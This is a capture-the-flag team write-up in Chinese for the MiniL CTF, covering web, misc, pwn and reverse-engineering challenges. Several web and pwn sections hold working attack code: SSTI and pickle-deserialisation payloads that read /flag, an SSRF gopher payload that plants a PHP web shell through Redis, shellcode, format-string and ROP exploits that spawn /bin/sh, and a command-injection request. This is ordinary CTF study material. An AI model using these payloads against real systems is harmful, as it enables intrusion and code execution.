# MiniL

<font color="green">**URL**:https://ctf.xidian.edu.cn/#/index<br>
**Team**:7!u!w<br>
**Start Time**: 5.06 20:00<br>
**End Time**: 5.12 20:00</font>

---

[TOC]

---
## WEB

### WEB1-easy_java  |  Worked: Wanan & Noah

#### Payload

```
http://8a9b571f-0700-4244-98e6-df5692c7de61.web.woooo.tech/////?code=(new java.io.BufferedReader(new java.io.FileReader("/flag"))).readLine()
```
---

### WEB2-L inc.  |  Worked: Wanan & Noah

#### 预期解

base64解码后，将序列化字符串中的NEWFALSE(0x89)修改为NEWTRUE(0x88)，即可以正常登录。

使用`pickle`和`pickletools`进行序列化与反序列化。

登陆后用户名处存在SSTI，将用户名修改为注入payload。

##### EXP

```python
# WEB2-1.py
from base64 import b64encode as be
import requests
import re

url = input("\033[1;34m[^_^] ? Input Target Url: \033[0m") + "home"

while True:
    code = "{{" + input("\033[1;34m[^_^] > \033[0m").replace("\"", "\'") + "}}"
    code_len = hex(len(code))[2:]
    if len(code_len) > 2:
        print("\033[1;31m[x_x] ! Code length limit breakthrough, limit: 0xff.\033[0m")
    if len(code_len) == 1:
        code_len = "0" + code_len
    code_len = r"\x" + code_len
    basestr = [r"\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c", r"\x94\x8c\x03vip\x94\x88ub."]
    payload = "b\"" + basestr[0] + code_len + code + basestr[1] + "\""
    # print(eval(payload))
    payload_b = be(eval(payload)).decode()
    header = {
        "Cookie": "user=" + payload_b,
    }
    try:
        response = requests.get(url=url, headers=header)
        pattern = re.compile(r'<h1>Hello, dear ([\w\W]*)</h1>')
        result = re.search(pattern, response.text)
        if result:
            print(result.group(1))
        else:
            print("\033[1;31m[x_x] ! Error, no response context find.\033[0m")
    except requests.ConnectionError:
        print("\033[1;31m[x_x] ! Error, examine your network connection.\033[0m")
```


#### 非预期

猜测flag在`/flag`，手写opcode将用户名处写成flag然后回显出来

```python
# WEB2-2.py
import app
import base64

data = b"""capp
User
(c__builtin__
getattr
p0
(c__builtin__
open
(S'/flag'
tRS'read'
tRp1
)RI01
tR."""

print(base64.b64encode(data))
```

```python
# app.py
class User(object):
    def __init__(self, name, vip):
        self.name = name
        self.vip = vip
```
学会了怎么手写opcode，收获颇丰

---

### WEB3-template  |  Worked: Wanan & Noah

先手动去了个混淆，发现对花括号和百分号的过滤在前端，直接向`/build`发请求即可，然后就是ssti过滤的绕过

去混淆后的JS代码:

```javascript
// script.js
function abc(a, b) {
    var la = a['length'];
    var lb = b['length'];
    var ans = [];
    for (var i = 0; i < lb; i++) {
        ans[i] = String.fromCharCode(a[i % la].charCodeAt(0) ^ b[i].charCodeAt(0));
    }
    return ans['join']('');
};


function de(a1, a2) {
    return abc(a1, atob(a2));
};

function submit() {
    var input = document.getElementById('code')['value'];
    if (input.search('{|}|%') !== -1) {
        alert('hack!!!!!');
    } else {
        var key = abc('xdsecminil', input);
        var XMLResponce = new XMLHttpRequest();
        XMLResponce.open('POST', '/build', true);
        XMLResponce.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        var data = 'data=' + btoa(key);
        XMLResponce.send(data);
        XMLResponce.onreadystatechange = function () {
            if (XMLResponce.status === 200) {
                document.getElementById('result').innerText = XMLResponce.responseText;
            } else {
                alert("request error");
            }
        };
    }
    ;
}
```

#### EXP

```python
from base64 import b64decode as bd
from base64 import b64encode as be
import requests
import time


def abc(a, b):
    len_a = len(a)
    len_b = len(b)
    result = ""
    for i in range(len_b):
        result += chr(ord(a[i % len_a]) ^ ord(b[i]))
    return result


def de(a, b):
    return abc(a, bd(b))


def get_key(a):
    return be(abc("xdsecminil", a).encode())


url = input("\033[1;34m[^_^] ? Input Target Url: \033[0m") + "build"
while True:
    code = input("\033[1;34m[^_^] > \033[0m")
    if code == "BRUTE":
        for p in range(0, 200):
            pcode = r'{{""["__cla""ss__"]["__ba""se__"]["__subcl""asses__"]()[' + str(i) + r']["__in""it__"]["__glo""bals__"]["__buil""tins__"]["eval"]("__import__(\"o\"\"s\")")["popen"]("cat /fl""ag")["read"]()}}'
            data = {
                "data": get_key(pcode).decode(),
            }
            response = requests.post(url=url, data=data)
            if "500" in response.text:
                print("\033[1;31m[x_x] @", p, " is not correct.\033[0m")
            else:
                print("\033[1;33m[@_@] Probably find flag.\033[0m")
                print("\033[1;33m", response.text, "\033[0m")
                break
            time.sleep(0.2)
    else:
        key = get_key(code).decode()
        data = {
            "data": key,
        }
        response = requests.post(url=url, data=data)
        if "500 Internal Server Error" in response:
            print("\033[1;31m[x_x] Execute Error.\033[0m")
        else:
            print(response.text)
```

---

### WEB4-protocol  |  Worked: Wanan & Noah

~~随便输一个地址进去，发现访问了相应的网页。~~

后来换了环境，无法访问外网。

测试一下，发现`file://`、`127.0.0.1`和`localhost`都被过滤了。

`file://`的过滤可以用`file:+绝对路径`的方式绕过，`127.0.0.1`的过滤可以用`0.0.0.0`来绕过。

payload:`url=file:/var/www/html/index.php`

在网页源码中看到php源码：

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
    <a>访问点东西？</a><br/><br/>
	<div>
	   	<form action="index.php" method="POST" >
			<input type="text" name="url" placeholder="Your url" />
		</form><br/>
	</div>
</body>
</html>

<?php
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}

if(isset($_POST['url'])){
	$url = $_POST['url'];
	if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match)) {
		die('这样子可不行哦');
	}
	curl($url);
}

if(isset($_POST['minisecret'])){
	system('ifconfig eth1');
}
?>
```

过滤了`file://`、`dict`、`../`、`127.0.0.1` 和`localhost`。

POST传参，看到网络参数：

```shell
eth1: flags=4163 mtu 1450 inet 172.192.15.2 
netmask 255.255.255.0 broadcast 172.192.15.255 
ether 02:42:ac:c0:0f:02 txqueuelen 0 (Ethernet) 
RX packets 0 bytes 0 (0.0 B) 
RX errors 0 dropped 0 overruns 0 frame 0 
TX packets 0 bytes 0 (0.0 B) 
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
```

发现这是一个内网环境下的主机，所在网段为`172.192.74.0/24`。

试了一下，发现`172.192.15.3`也开着http服务。并且有提示：flag就在这台机子上面，可是你怎么获得呢？

手动尝试ssrf常攻击的几个端口，发现6379上起了redis服务，然后拿gopherus生成payload直接打redis，把/flag写入shell.php,因为lt师傅过滤了../所以直接猜flag在/flag，拿到flag

#### payload

```
url=gopher://127.192.15.3:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```


---

## MISC

### MISC1-好白给的签到题  |  Worked: Noah

#### EXP

```python
from base64 import b64decode as bd

while True:
    fin = open("story.txt", "rb")
    data = fin.read()
    fin.close()
    try:
        data_ = bd(data)
        data_.decode("utf-8")
    except Exception:
        data_ = bd(data[::-1])
    if "{" in data_.decode():
        print(data_.decode())
        break
    fout = open("story.txt", "wb")
    print(data_)
    fout.write(data_)
    fout.close()
```
---

### MISC2-抓猫猫  |  Worked: Wanan & Noah

k倍博弈。

将每次cdcq取完后剩下的猫猫数量转成2进制，取走当前可取数量下的全部的二进制1。

即保证cdcq每次抓猫猫都会从二进制0位借位。

---

### MISC3-好康的硬盘  |  Worked: Wanan & Noah

拿到压缩包，解压之后拿到一个文本文档和一个rar压缩包。

txt是经过隐写的：[Unicode Steganography with Zero-Width Characters](http://330k.github.io/misc_tools/unicode_steganography.html)

提取后拿到解压密码的hint：`minil****`。

用rar2john提取hash，然后用hashcat进行掩码爆破，因为爆破全字符集太慢了，于是试了一下仅数字，运气好，爆出来了:`minil4396`。

解压之后拿到硬盘镜像，用`X-ways Forensics`或`火眼取证`导出其中的视频文件和txt。

视频文件拆分帧，找到7张有数字的聊天记录。

```bash
ffmpeg -i inputfile.avi -r 1 -f png %d.png
```

txt是一堆奇怪的英文。这个txt题目是奇怪的邮件，把内容全部往谷歌里一丢，找到[垃圾邮件隐写](https://www.spammimic.com/)。

在这可以解密，需要密码，密码就是图片里的数字，附件更新之后拿到密码为`7355608`。即可解出flag。

`MiniLCTF{n3ver_g0nna_L3t_Y0u_dowN}`

---

### MISC4-Recombination  |  Worked: Noah

拿到压缩包，试图解压发现提示有密码。winrar还提示rar文件头损坏。

学习一下rar的文件头格式: [rar文件头](https://blog.csdn.net/Claming_D/article/details/105899397)

发现文件头外存在一个CRC校验信息，进行校验，CRC不一致。

在010的模板中的`struct RarBlock block[0]` > `struct FileHeadBlock file` > `struct WinFileAttrs Attributes` > `uint32 ENCRYPTED`和`struct RarBlockType HeadType` > `struct FileHeadFlags HEAD_FLAGS` > `ubyte PASSWORD_ENCRYPTED`处进行修改。

再次解压，成功得到`flag`文件内容：

```cao
67535629127067535629127067535629127067535629127067535629127067535629127067535629127067535629127069504871727229504871727229504871727229504871727229504871727229504871727229504871727229504717272229189643338604189643388044189643880444189643800444189643800444189648000444896648000444896680000444856640046267556640462265556644662655556644626655556644626655556644266655566444266655566442666655562264128892882264188992822261888928222261888928222261888928222261888928222611888928222618888928222490201962120490209622120902009621200902096211200920962112000920621112000206621112000266211112000298858437138098858371138098558371380098558313380095588313800095588133800055888133000055881333000054636334439724636344339724636344397224636343997224363343972224363339972223633339922223633399922223443860892231443868922231443868922311443889223111438889231111438892311111388923111111388931111111324165785927324165785927324165785927324165785927324165785927324165785927324165785927324167859273328488387524508488387524508488387524508488387524508488387524508488387524508488387524508488387524508521309913458521309913485221309913485221309913485221309934852213099334852213093334852213093334852202490120063902490120039024490120039024490120039024490120339024490200339024490000339024490000339022905041793622905041736229055041736229550417362295550417362295550473362295550433362295550433362295231874163855231874138555218774138555188774138555888774138555888771338555888773338555888773338555893138793884093138738884093387738884933387388884933887388849338873888849388738888849387388888493380269308765240269387652402693877652426698777522426988777522426988775522269988755522269887555222669449672101377449621013774496210113774996100137749961100137749961101337799661103337999661103337999674371396420274313996420274313964420243319644202233319642002233319422002333319222022333319222022331779798898051797998898051797998988051979989880519979989805199799898805197998988055197998988055197406022843111406022843111406022843111406022843111406022843111406022843111406022843111406022843111498622523273998622523273998622523273998622523273998622523273998622523273998622523273998622523273997809521327337809521373377809521373377809521373377809521373377809521373377095521373377095521373377124901443251124901432511124901432511124901432511124901432511124901432511249011432511249011432511267882138935467882138954667882138956678821338956678821338956678821338956788813338956788813338956789735041941439735041944399735041943999735019443999735019443999735019443997735194443997735194443997272016194996272016194962272016194962722016194962722016194962722016194627722011944627722011944627761782965943761782965937661782965937667822965937667822965937667822965376678229653776678229653776677689639697567689639695677689639695677686399695677686399695677686399956776863999567776863999567776572744056004572744056045572744050455572740500455577405004555577405045555577405045555577405045555587101079076987101090769871101090768711010900768711109007687711109076687711109076677111109076677113238052515113238052515113238052515113238052515113238052515113238052515113238052515113238052515113878052857257878052857257878052857257878052857257878052857257878052857257878052857257878052857257876818937270676818937270676818937270676818937270676818937270676818937270676818937270676818937270670169705132990169705132990169705132901697051329016697051320166997051321669997051321699970511321699230507280235230507280235230507280252305072802523005072802230055072802300555072802300555028802300510723328716110723287716110723287711110723287711100723287711007723287710077723287710077722887710074999503704944999537004449995337004449995337004499995337004999995337004999995337004999995377004999530661828543530668288435306682288435306682284355306682284353006682284330006682284330006622884330096464542097796464420977796464420977796464429777796464429777966464429779666464429779666464297779669920073976499920039776499920039776499920037766499920037766999920037766999920037766999920377766999272282621608272286211608272286211608272282111608272282111608272282111608272282111608272221111608284257389119984257891119984257891119984258911119984258911119984258911119984258911119984259111119981491797144281491771444281491771444281497711444281497711444814497711444144497711444144497111444144795289282054795282822054795282822054792822822054792822822047992822822079992822822079928228822079994184177940894184177940894184177940894184177940894184177940894184177940894184177940894184177940897494468598527494468598527494468598527494468598527494468598527494468598527494468598527494468598527
```

尝试了转16进制，shellcode等常规操作。

然而还是想不到是什么编码或者加密。

后来在一篇[DASCTF三月赛的WP](https://blog.csdn.net/mochu7777777/article/details/115276176)中看到关于aa3d的内容，后来又搜到了[ByteCTF 2020 Misc WP](https://john-doe.fun/bytectf-2020-misc-writeup/),感觉字符串的重复情况相当类似。

于是下载了[aa3d](http://aa-project.sourceforge.net/aa3d/)，查看使用方式，发现可以输出纯数字版本的字符画。试着生成了一个，发现与题目中的字符串格式完全相同：

```
67535629127063562912706353562912706353562912706353562912706353562912706353562912
68843149206868843149206868843149206868843149206868843149206868843149206868843149
```

字符串长度为4559，正好分解为47\*97的矩阵。

放在记事本里，截图。将截图用stegsolve打开，使用`Analyze`>`Stereogram Solver`，调整图片位移，看到flag：

![](https://md.wanan.world/uploads/upload_57db6e2f88a325274bcf3639b83bb41c.png)


---

## PWN

### PWN1-shellcode  |   Worked: BB

```python
# PWN1.py
from pwn import *
context(arch = 'amd64',os='linux',log_level = 'debug')
p = process('./shellcode_loader')
#p = remote('pwn.woooo.tech',10266)
gdb.attach(p,"b *$rebase(0x1232)")

shellcode = '''
    mov rax, qword ptr[rsp + 0x50];
    jmp rax;
'''
shellcode2 =''' 
    xor rbx,rbx;
    mov rax, qword ptr[rbp + 0x58];
    jmp rax;
'''
shellcode3 = '''                       
    lea rdi, qword ptr[rsp + 0x70];
    push rbx;
    pop rsi;
    push rsi;
    pop rdx;
    push rdx;
    pop rax;
    mov al, 59;
    syscall;
'''
shellcode = asm(shellcode) + b'//bin/sh'
shellcode2 = asm(shellcode2)
shellcode3 = asm(shellcode3)

p.send(shellcode)
p.sendline(shellcode2)
p.sendline(shellcode3)
p.interactive()
```
> 1. 没有操作数的指令      1个字节
>
> 2. 操作数只涉及寄存器的的指令      2个字节
> 如：mov bx,ax
>
> 3. 操作数涉及内存地址的指令       3个字节
> 如：mov ax,ds:[bx+si+idata]
>
> 4. 操作数涉及立即数的指令
> 指令长度为：寄存器宽度+1
> 8位寄存器，寄存器类型=1，如：mov al,8；指令长度为2个字节
> 16位寄存器，寄存器类型=2，如：mov ax,8；指令长度为3个字节
>
> 5. 跳转指令
>     分为2种情况：
>
>   * 段内跳转
>     指令长度为2个字节或3个字节
>
>     jmp指令本身占1个字节
>
>     段内短转移，8位位移量占一个字节，加上jmp指令一个字节，整条指令占2个字节
>     如：jmp short opr
>
>     段内近转移，16位位移量占两个字节，加上jmp指令一个字节，整条指令占3个字节
>     如：jmp near ptr opr
>
>   * 段间跳转
>
>     指令长度为5个字节
>     如：jmp dword ptr table[bx][di]
>     或 jmp far ptr opr
>     或 jmp dword ptr opr
>
> 6. inc指令
>    占用一个字节
>
> 7. push指令
>    占用一个字节
>
> 8. segment声明
>    占用两个字节
>    如codesg segment
>
> 9. int 21h
>    占用两个字节

然后做题的时候和做题后我就是个傻逼，记录一下被骂的过程和被骂的原因：

这是我第一遍的exp:

```python
from pwn import *
context(arch = 'amd64',os='linux',log_level = 'debug')
p = process('./shellcode_loader')
#p = remote('pwn.woooo.tech',10063)
#gdb.attach(p,"b *$rebase(0x1232)")

shellcode = '''
    mov rax, qword ptr[rsp + 0x50];
    jmp rax;
'''
shellcode = asm(shellcode, arch='amd64', os='linux') + b"//bin/sh"
# 3 + 4 + 1 + 7 = 15
p.sendline(shellcode)

shellcode2 = '''                       
    lea rdi, byte ptr[rsp + 0x40];
    push rbx;
    pop rsi;
    push rsi;
    pop rdx;
    push rdx;
    pop rax;
    mov al, 59;
    syscall;
'''
# 5 + 1*6 + 3 + 1 = 15
shellcode2 = asm(shellcode2, arch='amd64', os='linux')
p.send(shellcode2)

p.interactive()
```

本地通了，但是远程死活不通，然后我在ubuntu18、16上都能通，（就是没有试ubuntu20，因为我印象中ubuntu20的shellcode执行有点问题）。最后还是尝试了一下ubuntu2004，发现了问题，rbx不一定是0。

好了，来说说bb被骂路程

![eqqieyyds0.png](https://i.loli.net/2021/05/08/LaHl4dtFIEcb1JC.png)

这是bb本地能通，远程没通。

![eqqieyyds1.png](https://i.loli.net/2021/05/08/vVDIqnHemSRodXN.png)

这是远程通了拿到flag

对了，这是最佳答案：

![eqqieyyds2.png](https://i.loli.net/2021/05/08/rldh9mqbM3nyzuj.png)

---

### PWN2-easy_repeater   |   Worked: BB

简单的白给

#### EXP

```python
from pwn import *
binary = './baby_repeater'
context(arch='amd64', os='linux',log_level='debug')

#p = process(binary,env={'LD_PRELOAD':'./libc-2.31.so'})
p = remote('pwn.woooo.tech', 10209)
elf = ELF(binary)
libc = ELF("./libc-2.31.so")

ru = lambda x:p.recvuntil(x)
sla = lambda x,y:p.sendlineafter(x,y)
sa = lambda x,y:p.sendafter(x,y)

#gdb.attach(p, 'b *$rebase(0x145d)\nc\nx/gx $rebase(0x3258)\n')
sla("> ",b'%111$p')
ru("Your sentence: 0x")

libc_start_addr = int(p.recv(12),16)
libc_base = libc_start_addr - libc.sym['__libc_start_main'] - 243
shell_addr = libc_base + 0xe6c81

log.success(hex(libc_base))
log.success('shell_addr--->'+hex(shell_addr))

sla("> ",b'%107$p')
ru("Your sentence: 0x")
main_addr = int(p.recv(12),16) - 42
log.success('main_addr--->'+hex(main_addr))

base = main_addr - 0x14d5

hook_got = elf.got['exit'] + base
log.success("hook_got---->"+hex(hook_got))
payload1=fmtstr_payload(8, {hook_got: shell_addr},numbwritten=15)
log.info(str(len(payload1)))
sla("> ",payload1)
print(payload1)
sla("> ","exit")
p.interactive()

'''
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''
```

---
### PWN3-twins  |  Worked: BB

第一次见这个还是挺有意思的……

还算是很简单的啦=_=

``` python
from pwn import * 
binary = './pwn1'
context(log_level='debug')
p=process(binary)
p = remote("pwn.woooo.tech", 10268)
ru = lambda x:p.recvuntil(x)
sla = lambda x,y:p.sendlineafter(x,y)
sa = lambda x,y:p.sendafter(x,y)
sl = lambda x:p.sendline(x)

# 64
pop_rax = 0x0000000000451a57
pop_rdi = 0x000000000040185a
pop_rdx = 0x000000000040175f
pop_rsi = 0x000000000040f3fe
binsh_addr_x64 = 0x00000004c5220
syscall_ret = 0x000000487c99
add_rsp = 0x00000000004029c2 # 0x98
# 32
gets_addr = 0x8058474
pop_eax = 0x080b05ca
pop_edx_ebx = 0x0805ede9
pop_ecx = 0x080642b1
binsh_addr = 0x80e83c0
int_addr = 0x0804a402
add_esp = 0x0804b08e #0x2c

payload = b'a'*0x44 + b'b'*0x4
payload += p32(add_esp)
payload += b'c'*12
payload += p64(add_rsp)
payload += b'd'*24

payload += p32(gets_addr) + p32(pop_eax) + p32(binsh_addr)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx_ebx) + p32(0) + p32(binsh_addr)
payload += p32(pop_eax) + p32(0xb)
payload += p32(int_addr)

payload += b'd'*0x54
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(binsh_addr_x64)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(syscall_ret)
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(binsh_addr_x64)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall_ret)

sla("say ?\n", payload)
sl(b'/bin/sh\x00')
p.interactive()
```

---

### PWN4-Cross Platform Calculator  |  Worked:BB & Noah & Wanan

我的思路一开始就是正确的！！！！

```python
from pwn import *
context.log_level='debug'
p = process('./httpd')
#gdb.attach(p,"b *$rebase(0x160E)")
input()
payload = '''GET /calc?x=`cat$IFS./flag`));echo$IFS$((1&y=1&action=add HTTP/1.1\r\n'''
p.sendline(payload)
p.recv()
p.recv()
```

----

## RE

### RE2-sub  |  Worked: BB & Noah

傀儡进程，附加段。

查看段发现.what?

dump内存，直接重新分析。

check函数相当于是一个函数指针（应该叫做虚表结构），x一下，发现它还有另外一个函数

```python
key=[0x5A,0x46,0x59,0x46,0x7B,0x5C,0x43,0x51,0x74,0x63,0x47,0x0E,0x4C,0x68,0x0E,0x4C,0x68,0x43,0x47,0x3,0x68,0x51,0x5E,0x44,0x3,0x68,0x51,0x0E,0x5E,0x50,0x1E,0x4A]
for i in range(32):
    tmp = key[i]^0x55
    tmp -= 4
    print(chr(tmp^0x66),end='')
#miniLctf{Th1s_1s_th4_fak4_f1ag!}

key = [0x5A,0x26,0x59,0x26,0x7B,0x5C,0x43,0x51,0x54,0x6D,0x52,0x68,0x0E,0x4C,0x68,0x4C,0x0F,0x68,0x0E,0x59,0x43,0x3,0x4D,0x3,0x4C,0x43,0x0E,0x59,0x50,0x1E,0x1E,0x4A]
for i in range(32):
    tmp = key[i]^0x66
    tmp -= 4
    print(chr(tmp^0x55),end='')
# miniLctf{Re_1s_s0_1nt4r4st1ng!!}
```

---

### RE3-Ooooops  |  Worked: BB

这个题吧，没啥说的，直接上exp：

```python
def brute(x):
    print("[@_@] ", x, ": ")
    flag = ["m", "i", "n", "i", "l", "c", "t", "f", "{"]
    v4 = "!V -}VG-bp}m-nG!b|ra GyGE|Drp D"
    v3 = [16, 4, 24, 11, 24, 16, 4, 21, 11, 5, 31, 46, 33, 46, 72, 21, 6, 46, 17, 59, 5, 
          62, 46, 24, 21, 72, 46, 59, 33, 31, 10]
    for i in range(200):
        flag.append("")
    for i in range(30):
        try:
            flag[9 + 2 * i] = chr((((v3[i]) ^ 0x42) - 4) ^ 0x37)
        except:
            pass
    for i in range(0x1f):
        try:
            flag[9 + 2 * i + 1] = chr(((ord(v4[i]) ^ 0x13 ^ x) + 4) ^ 0x4D)
        except:
            pass
    f = "".join(flag)
    print("[?_?] ", f)

for i in range(255):#暴力破解
    brute(i)
```
